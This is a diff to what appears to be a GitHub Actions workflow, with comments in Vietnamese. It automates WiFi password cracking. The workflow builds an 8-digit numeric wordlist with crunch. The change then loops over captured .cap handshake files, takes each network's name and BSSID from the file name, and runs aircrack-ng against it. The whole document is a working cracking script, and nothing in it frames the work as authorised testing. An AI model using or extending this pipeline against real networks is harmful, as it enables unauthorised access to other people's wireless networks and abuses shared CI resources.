@@ -20,4 +20,18 @@ jobs:
         crunch 8 8 0123456789 -o wordlist-probable.txt
     - name: Aircrack
       run: |
-        sudo aircrack-ng file.cap -w wordlist-probable.txt -q
+        # Đường dẫn tới thư mục chứa các tệp tin .cap
+        directory="./"
+
+        # Lặp qua tất cả các tệp tin .cap trong thư mục
+        for file in "$directory"/*.cap; do
+            # Kiểm tra xem tệp tin tồn tại và có quyền đọc
+            if [ -f "$file" ] && [ -r "$file" ]; then
+                # Trích xuất phần tên từ tệp tin bằng lệnh awk
+                namewifi=$(echo "$file" | awk -F "_" '{print $2}')
+                obssiwifi=$(echo "$file" | awk -F "_" '{print $3}')
+                bssiwifi=$(echo "$obssiwifi" | sed 's/-/:/g')
+                #echo "Tên tệp tin: $name"
+                sudo aircrack-ng -e $namewifi -b $bssiwifi "$file" -w wordlist-probable.txt -q
+            fi
+        done
